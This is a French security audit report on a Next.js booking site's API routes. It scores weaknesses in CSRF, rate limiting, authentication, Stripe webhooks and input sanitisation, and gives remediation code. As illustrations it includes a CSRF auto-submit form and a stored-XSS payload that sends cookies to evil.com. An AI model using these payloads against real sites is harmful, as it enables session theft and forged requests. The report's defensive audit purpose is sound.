# Rapport d'Audit de Securite - API Routes Rastasafari

**Date de l'audit:** 2026-02-03
**Auditeur:** Expert Securite
**Version du projet:** rastasafari-web-project
**Scope:** Routes API Next.js (`/src/app/api/`)

---

## Score Global de Securite

# 62 / 100

**Classification:** MOYEN - Ameliorations necessaires avant mise en production

---

## Resume Executif

L'application Rastasafari presente une structure de base solide avec l'utilisation de Zod pour la validation et des headers de securite configures dans Next.js. Cependant, plusieurs vulnerabilites critiques et moyennes ont ete identifiees, principalement liees a l'absence d'authentification, de protection CSRF, et de rate limiting global.

---

## 1. Validation des Entrees (Zod)

### Score: 85/100

### Points Positifs

| Fichier | Implementation |
|---------|----------------|
| `/src/lib/validations.ts` | Schema Zod complet pour booking, contact, payment |
| `/src/app/api/booking/route.ts` | Utilisation de `safeParse()` avec gestion d'erreurs |
| `/src/app/api/contact/route.ts` | Validation complete des champs |
| `/src/app/api/payment/create-intent/route.ts` | Validation du nombre de participants |

### Vulnerabilites Detectees

#### [MOYEN] V1.1 - Validation insuffisante des dates
**Fichier:** `/src/lib/validations.ts` (ligne ~35)
```typescript
date: z
  .string()
  .refine((val) => {
    const date = new Date(val);
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    return date >= today;
  }, 'La date doit être dans le futur'),
```
**Probleme:** Pas de validation de la limite future (un utilisateur pourrait reserver pour dans 10 ans).
**Risque:** Donnees incoherentes, potentielle exploitation business.

#### [BAS] V1.2 - Regex telephone permissive
**Fichier:** `/src/lib/validations.ts` (ligne ~20)
```typescript
phone: z
  .string()
  .regex(/^[\d\s\-\+\(\)]+$/, 'Numéro de téléphone invalide')
```
**Probleme:** Accepte des chaines comme `++++----` qui ne sont pas des numeros valides.

#### [BAS] V1.3 - Pas de validation de l'email avec domaine
**Impact:** Accepte des emails avec des domaines inexistants ou temporaires.

### Recommandations
1. Ajouter une limite de date maximale (ex: 6 mois dans le futur)
2. Utiliser une librairie de validation telephone (libphonenumber)
3. Envisager la verification DNS des domaines email

---

## 2. Protection CSRF

### Score: 20/100

### Vulnerabilites Detectees

#### [CRITIQUE] V2.1 - Absence totale de protection CSRF
**Fichiers affectes:** TOUTES les routes API POST/PUT/DELETE

Les routes API n'implementent aucune protection CSRF:
- Pas de token CSRF dans les headers
- Pas de verification `Origin` ou `Referer`
- Pas d'utilisation de cookies SameSite strict

**Exploitation potentielle:**
```html
<!-- Site malveillant -->
<form action="https://rastasafari.com/api/booking" method="POST">
  <input type="hidden" name="firstName" value="Attacker">
  <!-- ... -->
</form>
<script>document.forms[0].submit();</script>
```

### Recommandations
1. **PRIORITE HAUTE:** Implementer un middleware CSRF avec tokens
2. Verifier l'header `Origin` contre une whitelist
3. Utiliser des cookies avec `SameSite=Strict`
4. Considerer l'utilisation de `@edge-csrf/nextjs`

**Exemple d'implementation:**
```typescript
// middleware.ts
import { csrf } from '@edge-csrf/nextjs';

export const config = {
  matcher: '/api/:path*',
};

export const middleware = csrf({
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
  },
});
```

---

## 3. Securite des Paiements Stripe

### Score: 75/100

### Points Positifs

| Aspect | Status | Fichier |
|--------|--------|---------|
| Verification signature webhook | OK | `/src/app/api/payment/webhook/route.ts` |
| Utilisation Payment Intents | OK | `/src/app/api/payment/create-intent/route.ts` |
| Calcul montant cote serveur | OK | Ligne 26 de create-intent |
| Gestion erreurs Stripe | OK | Erreurs custom sans leak |

### Vulnerabilites Detectees

#### [CRITIQUE] V3.1 - Pas de verification idempotency
**Fichier:** `/src/app/api/payment/webhook/route.ts`
```typescript
async function handlePaymentIntentSucceeded(paymentIntent: Stripe.PaymentIntent) {
  // Pas de verification si deja traite!
  const booking = await prisma.booking.update({
    where: { id: bookingId },
    data: { status: 'confirmed' }
  });
}
```
**Risque:** Double traitement si Stripe renvoie le webhook.

#### [HAUT] V3.2 - Metadata non validees
**Fichier:** `/src/app/api/payment/create-intent/route.ts` (ligne ~55)
```typescript
metadata: {
  // ...
  ...data.metadata, // Injection de metadata arbitraires!
},
```
**Risque:** Un attaquant peut injecter des metadata qui seront stockees dans Stripe.

#### [MOYEN] V3.3 - Pas de verification du montant au webhook
**Fichier:** `/src/app/api/payment/webhook/route.ts`
**Probleme:** Le webhook ne verifie pas que le montant paye correspond au montant attendu.

#### [MOYEN] V3.4 - BookingId non valide
**Fichier:** `/src/app/api/payment/webhook/route.ts` (ligne ~80)
```typescript
const bookingId = paymentIntent.metadata.bookingId;
// Pas de validation UUID!
const booking = await prisma.booking.update({
  where: { id: bookingId }, // Injection potentielle
```

### Recommandations
1. **CRITIQUE:** Ajouter une verification idempotence avec `paymentIntent.id` unique
2. **HAUT:** Supprimer la propagation de metadata utilisateur ou les filtrer
3. Verifier le montant dans le webhook contre la base de donnees
4. Valider le format bookingId avant utilisation

**Correction idempotence:**
```typescript
async function handlePaymentIntentSucceeded(paymentIntent: Stripe.PaymentIntent) {
  // Verifier si deja traite
  const existing = await prisma.booking.findFirst({
    where: { paymentIntentId: paymentIntent.id }
  });
  if (existing?.status === 'confirmed') {
    console.log('Payment already processed:', paymentIntent.id);
    return;
  }
  // Continuer le traitement...
}
```

---

## 4. Gestion des Erreurs (Information Disclosure)

### Score: 80/100

### Points Positifs

- Messages d'erreur generiques pour les erreurs 500
- Pas de stack trace exposee au client
- Erreurs Stripe encapsulees

### Vulnerabilites Detectees

#### [MOYEN] V4.1 - Leak d'informations dans les erreurs Prisma
**Fichiers:** Toutes les routes API
```typescript
} catch (error) {
  console.error('Error creating booking:', error); // Log serveur OK
  return NextResponse.json({
    success: false,
    error: 'Erreur serveur', // Message generique OK
    message: '...' // Mais pas de differentiation du type d'erreur
  }, { status: 500 });
}
```
**Probleme:** Toutes les erreurs retournent 500, pas de distinction entre erreur DB, validation, etc.

#### [BAS] V4.2 - Console.error en production
**Impact:** Les erreurs detaillees sont loggees, potentiellement vers des services de monitoring sans filtrage PII.

#### [BAS] V4.3 - Erreurs Stripe exposent le code
**Fichier:** `/src/app/api/payment/create-intent/route.ts` (ligne ~85)
```typescript
return NextResponse.json({
  success: false,
  error: 'Stripe error',
  message: error.message, // Expose le message Stripe brut
  code: error.code,       // Expose le code d'erreur
}, { status: 400 });
```

### Recommandations
1. Creer des codes d'erreur internes mappant les erreurs techniques
2. Filtrer les PII dans les logs avant envoi vers monitoring
3. Genericifier les erreurs Stripe cote client

---

## 5. Rate Limiting

### Score: 35/100

### Implementation Actuelle

| Route | Rate Limiting |
|-------|---------------|
| `/api/contact` | 3 messages/heure/email (basique) |
| `/api/booking` | AUCUN |
| `/api/booking/[id]` | AUCUN |
| `/api/availability` | AUCUN |
| `/api/payment/create-intent` | AUCUN |
| `/api/payment/webhook` | N/A (Stripe) |

### Vulnerabilites Detectees

#### [CRITIQUE] V5.1 - Pas de rate limiting sur /api/booking POST
**Risque:** Un attaquant peut creer des milliers de reservations en pending, saturant la base de donnees et bloquant les creneaux.

#### [CRITIQUE] V5.2 - Pas de rate limiting sur /api/payment/create-intent
**Risque:** Creation massive de Payment Intents, couts Stripe, DoS.

#### [HAUT] V5.3 - Rate limiting contact contournable
**Fichier:** `/src/app/api/contact/route.ts`
```typescript
const recentMessages = await prisma.contactMessage.count({
  where: {
    email: data.email, // Basé sur l'email fourni par l'utilisateur!
    createdAt: { gte: new Date(Date.now() - 60 * 60 * 1000) },
  },
});
```
**Probleme:** Un attaquant peut utiliser des emails differents pour chaque requete.

#### [HAUT] V5.4 - Pas de rate limiting par IP
**Impact:** Impossible de bloquer les attaques automatisees.

### Recommandations
1. **CRITIQUE:** Implementer un rate limiter global (upstash/ratelimit, Redis)
2. Rate limiting par IP + fingerprint, pas seulement email
3. Rate limits suggeres:
   - `/api/booking POST`: 10/heure/IP
   - `/api/payment/create-intent`: 5/minute/IP
   - `/api/availability`: 60/minute/IP
   - `/api/contact`: 3/heure/IP (pas email)

**Exemple d'implementation:**
```typescript
// lib/rate-limit.ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

export const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '1 h'),
  analytics: true,
});

// Dans la route API
const ip = request.headers.get('x-forwarded-for') || 'anonymous';
const { success, remaining } = await ratelimit.limit(ip);
if (!success) {
  return NextResponse.json({ error: 'Too many requests' }, { status: 429 });
}
```

---

## 6. Sanitization des Donnees

### Score: 60/100

### Points Positifs

- Prisma ORM previent les injections SQL par defaut
- Zod effectue une validation de type

### Vulnerabilites Detectees

#### [HAUT] V6.1 - Pas de sanitization HTML/XSS
**Fichiers:** `/src/app/api/booking/route.ts`, `/src/app/api/contact/route.ts`
```typescript
const booking = await prisma.booking.create({
  data: {
    firstName: data.firstName, // Pas de sanitization!
    specialRequests: data.specialRequests || null,
  },
});
```
**Risque:** Stored XSS si ces donnees sont affichees dans un dashboard admin.

**Exemple d'attaque:**
```json
{
  "firstName": "<script>document.location='https://evil.com/steal?c='+document.cookie</script>",
  "specialRequests": "<img src=x onerror='alert(1)'>"
}
```

#### [MOYEN] V6.2 - Pas de normalisation des emails
**Impact:** `user@GMAIL.com` et `user@gmail.com` sont traites comme differents.

#### [BAS] V6.3 - Pas de trim sur les champs texte
**Impact:** Espaces en debut/fin de chaine stockes en base.

### Recommandations
1. **HAUT:** Utiliser une librairie de sanitization (DOMPurify, sanitize-html)
2. Normaliser les emails (lowercase, trim)
3. Ajouter `.trim()` dans les schemas Zod

**Exemple:**
```typescript
import DOMPurify from 'isomorphic-dompurify';

firstName: z
  .string()
  .trim()
  .min(2)
  .max(50)
  .transform(val => DOMPurify.sanitize(val)),

email: z
  .string()
  .email()
  .toLowerCase()
  .trim(),
```

---

## 7. Configuration Supabase

### Score: 70/100

### Points Positifs

| Aspect | Status |
|--------|--------|
| Separation client/admin | OK |
| Variables d'environnement | OK |
| Validation au demarrage | OK |

### Vulnerabilites Detectees

#### [CRITIQUE] V7.1 - Service Role Key potentiellement expose
**Fichier:** `/src/lib/supabase.ts`
```typescript
export const supabaseAdmin = supabaseServiceKey
  ? createClient<Database>(supabaseUrl, supabaseServiceKey, {...})
  : null;
```
**Probleme:** Le client admin est exporte et pourrait etre importe cote client par erreur.

#### [HAUT] V7.2 - Pas de Row Level Security visible
**Observation:** L'API utilise Prisma, pas Supabase directement pour les requetes, mais si RLS n'est pas configure sur les tables Supabase, la clef anon pourrait acceder a tout.

#### [MOYEN] V7.3 - Clef anon publique
**Fichier:** `.env.example`
```
NEXT_PUBLIC_SUPABASE_ANON_KEY=your-supabase-anon-key
```
**Risque:** Meme si c'est prevu pour etre publique, sans RLS stricte, exposition des donnees.

### Recommandations
1. **CRITIQUE:** Marquer `supabaseAdmin` comme server-only
2. Verifier et documenter les politiques RLS
3. Auditer les permissions de la clef anon

**Correction:**
```typescript
// src/lib/supabase-admin.server.ts
import 'server-only'; // Empêche l'import côté client

export const supabaseAdmin = createClient<Database>(
  supabaseUrl,
  supabaseServiceKey!,
  { auth: { autoRefreshToken: false, persistSession: false } }
);
```

---

## 8. Authentification et Autorisation

### Score: 25/100

### Vulnerabilites Detectees

#### [CRITIQUE] V8.1 - Routes admin non protegees
**Fichiers:**
- `/src/app/api/booking/route.ts` (GET)
- `/src/app/api/contact/route.ts` (GET)

```typescript
/**
 * GET /api/booking
 * Get all bookings (admin only - should be protected in production)
 */
export async function GET(request: NextRequest) {
  // AUCUNE VERIFICATION D'AUTHENTIFICATION!
  const bookings = await prisma.booking.findMany({...});
```
**Risque:** N'importe qui peut lister TOUTES les reservations avec informations personnelles (email, telephone, adresses).

#### [CRITIQUE] V8.2 - Modification de reservation sans authentification
**Fichier:** `/src/app/api/booking/[id]/route.ts`
```typescript
export async function PUT(request: NextRequest, { params }: RouteParams) {
  // Seul l'ID est requis, pas de verification d'identite!
```
**Risque:** Un attaquant peut modifier n'importe quelle reservation s'il connait/devine l'ID.

#### [CRITIQUE] V8.3 - Suppression sans authentification
**Meme probleme pour DELETE sur `/api/booking/[id]`.**

#### [HAUT] V8.4 - Enumeration des IDs possible
**Observation:** Les IDs sont des UUID mais le GET `/api/booking/[id]` permet de verifier si un ID existe.

### Recommandations
1. **CRITIQUE:** Implementer NextAuth.js avec sessions
2. Proteger les routes admin avec middleware
3. Verifier que l'utilisateur possede la reservation avant modification
4. Ajouter un token de verification par email pour les operations sensibles

**Exemple:**
```typescript
// middleware.ts
import { withAuth } from 'next-auth/middleware';

export default withAuth({
  callbacks: {
    authorized: ({ req, token }) => {
      if (req.nextUrl.pathname.startsWith('/api/admin')) {
        return token?.role === 'admin';
      }
      return true;
    },
  },
});

export const config = {
  matcher: ['/api/admin/:path*', '/api/booking/:path*'],
};
```

---

## 9. Headers de Securite

### Score: 85/100

### Points Positifs

**Fichier:** `/next.config.js`
```javascript
headers: [
  { key: 'X-DNS-Prefetch-Control', value: 'on' },
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-XSS-Protection', value: '1; mode=block' },
  { key: 'Referrer-Policy', value: 'origin-when-cross-origin' },
]
```

### Manquants

#### [MOYEN] V9.1 - Pas de Content-Security-Policy (CSP)
**Risque:** XSS et injection de scripts tiers.

#### [BAS] V9.2 - Pas de Permissions-Policy
**Impact:** Fonctionnalites du navigateur non restreintes.

### Recommandations
```javascript
{
  key: 'Content-Security-Policy',
  value: "default-src 'self'; script-src 'self' 'unsafe-inline' https://js.stripe.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.stripe.com; frame-src https://js.stripe.com;"
},
{
  key: 'Permissions-Policy',
  value: 'camera=(), microphone=(), geolocation=()'
}
```

---

## 10. Configuration des Emails

### Score: 65/100

### Vulnerabilites Detectees

#### [MOYEN] V10.1 - Injection dans les templates email
**Fichier:** `/src/lib/email.ts`
```typescript
html: `
  <p><strong>Client:</strong> ${data.firstName} ${data.lastName}</p>
  <p><strong>Demandes spéciales:</strong> ${data.specialRequests}</p>
`
```
**Risque:** HTML injection dans les emails.

#### [BAS] V10.2 - Pas de verification SPF/DKIM documente
**Impact:** Risque de deliverabilite et phishing.

### Recommandations
1. Echapper le HTML dans les templates email
2. Documenter la configuration SPF/DKIM/DMARC

---

## Resume des Vulnerabilites par Priorite

### CRITIQUE (a corriger IMMEDIATEMENT)

| ID | Vulnerabilite | Impact |
|----|---------------|--------|
| V2.1 | Absence protection CSRF | Forgery de requetes |
| V5.1 | Pas de rate limiting booking | DoS, saturation |
| V5.2 | Pas de rate limiting payment | Couts Stripe, DoS |
| V7.1 | Service Role Key exposable | Acces total DB |
| V8.1 | Routes admin non protegees | Fuite de donnees PII |
| V8.2 | Modification sans auth | Manipulation reservations |
| V3.1 | Pas d'idempotence webhook | Double traitement paiements |

### HAUTE PRIORITE (corriger avant production)

| ID | Vulnerabilite | Impact |
|----|---------------|--------|
| V3.2 | Metadata Stripe non validees | Injection metadata |
| V5.3 | Rate limit contournable | Spam |
| V5.4 | Pas de rate limit par IP | Attaques automatisees |
| V6.1 | Pas de sanitization XSS | Stored XSS |
| V7.2 | RLS non verifiee | Exposition donnees |

### MOYENNE PRIORITE (corriger rapidement)

| ID | Vulnerabilite |
|----|---------------|
| V1.1 | Validation dates insuffisante |
| V3.3 | Montant non verifie webhook |
| V3.4 | BookingId non valide webhook |
| V4.1 | Pas de distinction erreurs |
| V6.2 | Emails non normalises |
| V9.1 | Pas de CSP |
| V10.1 | Injection email templates |

### BASSE PRIORITE (a planifier)

| ID | Vulnerabilite |
|----|---------------|
| V1.2 | Regex telephone permissive |
| V1.3 | Pas de validation domaine email |
| V4.2 | Console.error en production |
| V4.3 | Code erreur Stripe expose |
| V6.3 | Pas de trim champs |
| V9.2 | Pas de Permissions-Policy |
| V10.2 | SPF/DKIM non documente |

---

## Plan d'Action Recommande

### Phase 1 - Immediat (0-3 jours)
1. [ ] Implementer authentification NextAuth.js
2. [ ] Proteger routes GET admin avec middleware
3. [ ] Ajouter rate limiting global (Upstash)
4. [ ] Implementer protection CSRF

### Phase 2 - Court terme (1-2 semaines)
1. [ ] Ajouter idempotence au webhook Stripe
2. [ ] Sanitizer les entrees utilisateur (DOMPurify)
3. [ ] Valider metadata Stripe
4. [ ] Separer supabaseAdmin dans fichier server-only
5. [ ] Configurer CSP

### Phase 3 - Moyen terme (1 mois)
1. [ ] Audit RLS Supabase
2. [ ] Ameliorer validation (telephone, email)
3. [ ] Logging structure sans PII
4. [ ] Tests de penetration

---

## Fichiers Audites

| Fichier | Chemin Complet |
|---------|----------------|
| booking route | `/home/serinityvault/Desktop/rastasafari-web-project/src/app/api/booking/route.ts` |
| booking [id] | `/home/serinityvault/Desktop/rastasafari-web-project/src/app/api/booking/[id]/route.ts` |
| availability | `/home/serinityvault/Desktop/rastasafari-web-project/src/app/api/availability/route.ts` |
| contact | `/home/serinityvault/Desktop/rastasafari-web-project/src/app/api/contact/route.ts` |
| payment create | `/home/serinityvault/Desktop/rastasafari-web-project/src/app/api/payment/create-intent/route.ts` |
| payment webhook | `/home/serinityvault/Desktop/rastasafari-web-project/src/app/api/payment/webhook/route.ts` |
| validations | `/home/serinityvault/Desktop/rastasafari-web-project/src/lib/validations.ts` |
| supabase | `/home/serinityvault/Desktop/rastasafari-web-project/src/lib/supabase.ts` |
| stripe | `/home/serinityvault/Desktop/rastasafari-web-project/src/lib/stripe.ts` |
| email | `/home/serinityvault/Desktop/rastasafari-web-project/src/lib/email.ts` |
| db | `/home/serinityvault/Desktop/rastasafari-web-project/src/lib/db.ts` |
| next.config | `/home/serinityvault/Desktop/rastasafari-web-project/next.config.js` |

---

## Conclusion

L'application presente une base de code propre avec de bonnes pratiques (Zod, Prisma, headers de securite). Cependant, **l'absence d'authentification et de rate limiting constitue des vulnerabilites critiques** qui doivent etre corrigees avant tout deploiement en production.

Le score de **62/100** reflete une application en phase de developpement qui necessite un travail significatif sur la securite. Les recommandations fournies, si implementees, permettraient d'atteindre un score de 85+ et une application prete pour la production.

---

*Ce rapport a ete genere le 2026-02-03. Les vulnerabilites identifiees sont basees sur l'etat actuel du code et les meilleures pratiques de securite.*
